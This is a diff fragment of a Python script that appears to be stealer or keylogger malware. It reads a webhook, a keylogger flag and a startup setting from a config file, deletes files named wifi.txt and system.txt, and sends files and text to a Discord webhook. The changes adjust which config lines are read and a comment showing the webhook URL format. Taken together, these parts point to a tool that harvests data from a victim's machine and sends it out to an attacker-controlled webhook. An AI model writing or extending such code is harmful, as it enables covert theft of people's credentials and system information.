@@ -27,8 +27,8 @@ try:
     with open("todo.txt", "r") as f:
         lines = f.readlines()
         webhook = lines[0].strip()
-        keylogger = lines[1].strip()
-        Startup = lines[2]#.strip()
+        keylogger = lines[2].strip()
+        Startup = lines[3]#.strip()
         f.close()
 except:
     webhook = "null"
@@ -79,7 +79,7 @@ delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt"
 
 def send(url, files, text):
     try:
-        webhook = SyncWebhook.from_url(url)#"https://discord.com/api/webhooks/"
+        webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
     except:
         return
 
